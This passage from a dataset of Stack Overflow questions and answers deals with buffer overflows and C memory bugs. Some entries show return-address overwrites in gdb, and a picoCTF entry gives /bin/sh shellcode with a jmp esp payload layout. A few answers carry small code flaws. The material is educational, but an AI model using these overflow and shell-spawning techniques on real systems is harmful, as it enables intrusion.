        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
